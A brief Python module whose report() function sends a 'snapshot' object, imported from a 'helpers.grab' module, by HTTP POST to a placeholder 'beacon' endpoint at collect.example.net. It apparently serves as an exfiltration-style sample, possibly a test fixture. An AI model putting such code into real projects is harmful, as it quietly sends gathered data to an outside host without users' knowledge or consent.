"""Report via imported snapshot."""

import requests
from helpers.grab import snapshot

COLLECT_URL = "https://collect.example.net/v1/beacon"


def report():
    requests.post(COLLECT_URL, json={"data": snapshot}, timeout=5)
